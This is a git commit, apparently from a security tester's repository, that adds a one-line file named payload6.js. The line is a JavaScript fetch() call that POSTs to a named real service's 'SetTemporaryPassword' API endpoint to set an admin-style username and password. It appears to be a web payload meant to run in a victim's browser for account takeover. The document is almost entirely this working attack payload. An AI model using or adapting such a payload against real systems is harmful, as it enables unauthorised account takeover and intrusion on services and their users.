73cd8cb61f5e434b3ebbc087b263d2cc0f35e955
justtesting1234-source <eli@inspectiv.com>
2025-03-27 10:33:41 -0500

    Create payload6.js

---
+++ payload6.js
@@ -0,0 +1,1 @@
+fetch('https://integration.servicetitan.com/app/api/auth/SetTemporaryPassword',{headers:{'Content-Type': 'application/json'},method: "POST",body: JSON.stringify({"Username":"adminadmin","Password":"pass1234567"})})
